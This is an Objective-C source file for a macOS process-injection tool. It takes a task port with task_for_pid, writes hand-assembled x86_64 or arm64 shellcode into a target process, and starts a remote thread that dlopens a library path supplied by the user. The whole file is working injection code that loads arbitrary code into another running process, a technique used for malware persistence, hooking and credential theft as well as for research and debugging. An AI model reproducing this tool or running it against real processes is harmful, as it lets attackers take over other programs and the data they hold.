#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <mach/mach_vm.h>
#import <mach/thread_status.h>
#import <malloc/malloc.h>
#import <pthread.h>
#import <sys/stat.h>

#define STACK_SIZE 0x10000
#define CODE_SIZE 128

#ifdef X86_64
// X86_64 from ===> https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a

char injectedCode[] =
    // "\xCC"                            // int3

    "\x55"                         // push       rbp
    "\x48\x89\xE5"                 // mov        rbp, rsp
    "\x48\x83\xEC\x10"             // sub        rsp, 0x10
    "\x48\x8D\x7D\xF8"             // lea        rdi, qword [rbp+var_8]
    "\x31\xC0"                     // xor        eax, eax
    "\x89\xC1"                     // mov        ecx, eax
    "\x48\x8D\x15\x21\x00\x00\x00" // lea        rdx, qword ptr [rip + 0x21]
    "\x48\x89\xCE"                 // mov        rsi, rcx
    "\x48\xB8" // movabs     rax, pthread_create_from_mach_thread
    "PTHRDCRT"
    "\xFF\xD0"                     // call       rax
    "\x89\x45\xF4"                 // mov        dword [rbp+var_C], eax
    "\x48\x83\xC4\x10"             // add        rsp, 0x10
    "\x5D"                         // pop        rbp
    "\x48\xc7\xc0\x13\x0d\x00\x00" // mov        rax, 0xD13
    "\xEB\xFE"                     // jmp        0x0
    "\xC3"                         // ret

    "\x55"                         // push       rbp
    "\x48\x89\xE5"                 // mov        rbp, rsp
    "\x48\x83\xEC\x10"             // sub        rsp, 0x10
    "\xBE\x01\x00\x00\x00"         // mov        esi, 0x1
    "\x48\x89\x7D\xF8"             // mov        qword [rbp+var_8], rdi
    "\x48\x8D\x3D\x1D\x00\x00\x00" // lea        rdi, qword ptr [rip + 0x2c]
    "\x48\xB8"                     // movabs     rax, dlopen
    "DLOPEN__"
    "\xFF\xD0"         // call       rax
    "\x31\xF6"         // xor        esi, esi
    "\x89\xF7"         // mov        edi, esi
    "\x48\x89\x45\xF0" // mov        qword [rbp+var_10], rax
    "\x48\x89\xF8"     // mov        rax, rdi
    "\x48\x83\xC4\x10" // add        rsp, 0x10
    "\x5D"             // pop        rbp
    "\xC3"             // ret

    "LIBLIBLIBLIB"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00";
#else
// arm_64 from ===> https://stackoverflow.com/questions/76238521/arm64-code-injection-on-apple-m1-crashes-with-exc-bad-access

uint32_t copyBits(uint32_t reg, uint16_t value) {
  for (int i = 0; i <= 15; i++) {
    BOOL bitToSet = ((value >> i) & 1) != 0;
    reg &= ~(1 << (i + 5));
    reg |= (bitToSet ? 1 : 0) << (i + 5);
  }
  return reg;
}

void write_instruction_address(uint8_t *code, uint length, uint32_t v,
                               uint offset) {
  uint32_t instructions;
  NSData *instructionData = [NSData dataWithBytes:&code[length + offset]
                                           length:4];
  [instructionData getBytes:&instructions length:4];
  instructions = copyBits(instructions, (uint16_t)(v & 0xFFFF));
  memcpy(&code[length + offset], &instructions, 4);
}

NSData *gen_arm64_code(uint64_t dlopen) {
  uint8_t code[136] = {
      0xFD, 0x7B, 0xBD, 0xA9, 0xF5, 0x0B, 0x00, 0xF9, 0xF4, 0x4F, 0x02, 0xA9,
      0xFD, 0x03, 0x00, 0x91, 0x02, 0x4C, 0x40, 0xA9, 0x08, 0x50, 0x41, 0xA9,
      0x15, 0x10, 0x40, 0xF9, 0xBF, 0x0F, 0x00, 0xF9, 0xE3, 0x03, 0x01, 0xAA,
      0xE1, 0x03, 0x1F, 0xAA, 0xA0, 0x63, 0x00, 0x91, 0x00, 0x01, 0x3F, 0xD6,
      0xEA, 0x03, 0x00, 0xAA, 0xA0, 0x0F, 0x40, 0xF9, 0xEB, 0x03, 0x00, 0xAA,
      0x60, 0x02, 0x3F, 0xD6, 0xA0, 0x02, 0x3F, 0xD6, 0x80, 0x02, 0x3F, 0xD6,
      0xA0, 0x0F, 0x40, 0xF9, 0xF4, 0x4F, 0x42, 0xA9, 0xF5, 0x0B, 0x40, 0xF9,
      0xFD, 0x7B, 0xC3, 0xA8, 0xC0, 0x03, 0x5F, 0xD6,

      0x1F, 0x20, 0x03, 0xD5, 0x1F, 0x20, 0x03, 0xD5, 0x1F, 0x20, 0x03, 0xD5,
      0x1F, 0x20, 0x03, 0xD5, 0x1F, 0x20, 0x03, 0xD5,

      0x41, 0x00, 0x80, 0x52, 0xE2, 0xDD, 0x97, 0xD2, 0xA2, 0xD5, 0xBB, 0xF2,
      0x02, 0x00, 0xD6, 0xF2, 0x02, 0x00, 0xF4, 0xF2, 0x40, 0x00, 0x1F, 0xD6};

  int codeSize = sizeof(code);

  uint32_t beef = (uint32_t)(dlopen & 0x000000000000FFFF);
  uint32_t dead = (uint32_t)((dlopen & 0x00000000FFFF0000) >> 16);
  uint32_t b000 = (uint32_t)((dlopen & 0x0000FFFF00000000) >> 32);
  uint32_t a000 = (uint32_t)((dlopen & 0xFFFF000000000000) >> 48);

  write_instruction_address(code, codeSize, a000, -8);
  write_instruction_address(code, codeSize, b000, -12);
  write_instruction_address(code, codeSize, dead, -16);
  write_instruction_address(code, codeSize, beef, -20);

  return [NSData dataWithBytes:code length:codeSize];
}

#endif

int main(int argc, char *argv[]) {
  if (argc < 3) {
    printf("Usage: %s <pid> <path>\n", argv[0]);
    exit(0);
  }

  pid_t pid = atoi(argv[1]);
  char *path = argv[2];

  struct stat buf;
  int rc = stat(path, &buf);
  if (rc != 0) {
    printf("Unable to open library file %s\n", path);
    exit(0);
  }

  @autoreleasepool {
    task_t rtask;
    kern_return_t kr;

    kr = task_for_pid(mach_task_self(), pid, &rtask);
    if (kr != KERN_SUCCESS) {
      printf("[-] Failed to get task port for pid:%d, error: %s\n", pid,
             mach_error_string(kr));
      return -1;
    }
    printf("[+] Got access to the task port of process: %d\n", pid);

    printf("[+] Find symbol address.\n");
    uint64_t addr_of_pthread_create =
        (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
    uint64_t addr_of_dlopen = (uint64_t)dlopen;

#ifdef __arm64__
    printf("[+] Generated arm64 asm code\n");
    NSData *codeasm = gen_arm64_code(addr_of_dlopen);
    printf("[+] Write arm64 asm code to remote process\n");
    mach_vm_address_t remote_code;
    mach_vm_allocate(rtask, &remote_code, [codeasm length], VM_FLAGS_ANYWHERE);
    mach_vm_write(rtask, remote_code, (vm_offset_t)[codeasm bytes],
                  [codeasm length]);
    mach_vm_protect(rtask, remote_code, [codeasm length], 0,
                    VM_PROT_READ | VM_PROT_EXECUTE);

    printf("[+] Wrote parameters to remote process\n");
    uint64_t parameters[] = {
        remote_code + ([codeasm length] - 24),
        (uint64_t)dlsym(RTLD_DEFAULT, "_pthread_set_self"),
        addr_of_pthread_create,
        (uint64_t)dlsym(RTLD_DEFAULT, "thread_suspend"),
        (uint64_t)dlsym(RTLD_DEFAULT, "mach_thread_self"),
    };
    mach_vm_address_t remote_parameters;
    mach_vm_allocate(rtask, &remote_parameters, sizeof(parameters),
                     VM_FLAGS_ANYWHERE);
    mach_vm_write(rtask, remote_parameters, (vm_offset_t)parameters,
                  sizeof(parameters));

    mach_vm_address_t remote_dylib_path;
    printf("[+] Dylib path: %s length: %lu\n", path, strlen(path));
    mach_vm_allocate(rtask, &remote_dylib_path, strlen(path),
                     VM_FLAGS_ANYWHERE);
    mach_vm_write(rtask, remote_dylib_path, (vm_offset_t)path, strlen(path));
    mach_vm_protect(rtask, remote_dylib_path, strlen(path), 0,
                    VM_PROT_READ | VM_PROT_WRITE);

#else
    printf("[+] Generated x86_64 asm code\n");
    int i = 0;
    char *possiblePatchLocation = (injectedCode);
    for (i = 0; i < 0x100; i++) {
      extern void *_pthread_set_self;
      possiblePatchLocation++;

      if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0) {
        printf("pthread_create_from_mach_thread @%llx\n",
               addr_of_pthread_create);
        memcpy(possiblePatchLocation, &addr_of_pthread_create, 8);
      }

      if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0) {
        printf("dlopen @%llx\n", addr_of_dlopen);
        memcpy(possiblePatchLocation, &addr_of_dlopen, sizeof(uint64_t));
      }

      if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0) {
        strcpy(possiblePatchLocation, path);
      }
    }

    printf("[+] Write x86_64 asm code to remote process\n");
    mach_vm_address_t remote_code;
    mach_vm_allocate(rtask, &remote_code, CODE_SIZE, VM_FLAGS_ANYWHERE);
    mach_vm_write(rtask, remote_code, (vm_offset_t)injectedCode,
                  sizeof(injectedCode));
    mach_vm_protect(rtask, remote_code, sizeof(injectedCode), FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);
#endif

    printf("[+] Created remote stack\n");
    mach_vm_address_t remote_stack;
    mach_vm_allocate(rtask, &remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
    mach_vm_protect(rtask, remote_stack, STACK_SIZE, TRUE,
                    VM_PROT_READ | VM_PROT_WRITE);
    mach_vm_address_t local_stack = remote_stack;
    remote_stack += STACK_SIZE / 2;

    printf("[+] Created remote thread\n");
    thread_act_t thread;

#ifdef __arm64__
    arm_thread_state64_t remote_state;
    remote_state.__x[0] = remote_parameters;
    remote_state.__x[1] = remote_dylib_path;
    remote_state.__pc = remote_code;
    remote_state.__sp = remote_stack;
    remote_state.__lr = local_stack;
    kr = thread_create_running(rtask, ARM_THREAD_STATE64,
                               (thread_state_t)&remote_state,
                               ARM_THREAD_STATE64_COUNT, &thread);
#else
    x86_thread_state64_t remote_state;
    remote_state.__rsp = remote_stack;
    remote_state.__rbp = remote_stack;
    remote_state.__rip = remote_code;
    kr = thread_create_running(rtask, x86_THREAD_STATE64,
                               (thread_state_t)&remote_state,
                               x86_THREAD_STATE64_COUNT, &thread);
#endif

    if (kr != KERN_SUCCESS) {
      if (kr != KERN_SUCCESS) {
        printf("[-] Unable to create remote thread, pid:%d, error: %s\n", pid,
               mach_error_string(kr));
        return -2;
      }
    }
  }

  return 0;
}